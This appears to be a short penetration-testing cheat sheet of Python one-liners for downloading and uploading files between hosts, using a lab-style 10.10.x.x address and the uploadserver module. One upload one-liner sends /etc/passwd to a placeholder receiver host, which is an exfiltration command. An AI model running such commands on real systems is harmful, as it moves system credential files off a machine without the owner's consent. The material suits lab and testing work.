
## download operations

```
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://example.com/file.txt", "file.txt")'
```

using requests
```
python3 -c 'import requests;r = requests.get("http://10.10.17.248:8000/ratao.txt");print(r.text)'
```

---
## upload operations

on the host that will receive the file:
```
python3 -m uploadserver 
```
on the host that will upload the file:
```
python3 -c 'import requests;requests.post("http://<ip_receiver_host>:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

file_upload.py - example
```
import requests

url = "http://10.10.17.248:8000/upload"
file = open("test.txt","rb")

r = requests.post(url,files={"files":file})
```